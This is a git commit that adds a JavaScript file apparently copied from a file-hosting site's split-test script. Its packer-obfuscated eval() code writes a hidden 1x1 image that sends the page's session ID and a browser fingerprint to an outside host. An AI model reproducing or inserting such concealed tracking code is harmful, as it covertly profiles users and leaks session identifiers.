7120f6f48169da864fb240cfae17b051cd432e49
lonelydasher <lonely.dasher@yahoo.com.vn>
2016-12-10 13:27:35 +0700

    Add files via upload

---
+++ http _filesmy.com_classic_scripts_splittest.js 2.js
@@ -0,0 +1,5 @@
+/*
+eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('6 0=7 5();4.1(\'<2 3="8://9.g/e.d?a=\'+b+\'&f=\'+0.c()+\'" />\');',17,17,'fp1|write|img|src|document|Fingerprint|var|new|http|fileml|s|SESS_ID|get|php|splittest||com'.split('|'),0,{}))
+*/
+eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('8 0=9 a();b.7(\'<6 2="3://4.5/c.d?l=\'+m+\'&f=\'+0.k()+\'" j="e:g;" h="1" i="1" />\');',23,23,'fp1||src|http|fileml|com|img|write|var|new|Fingerprint|document|splittest|php|display||none|height|width|style|get|s|SESS_ID'.split('|'),0,{}))
+
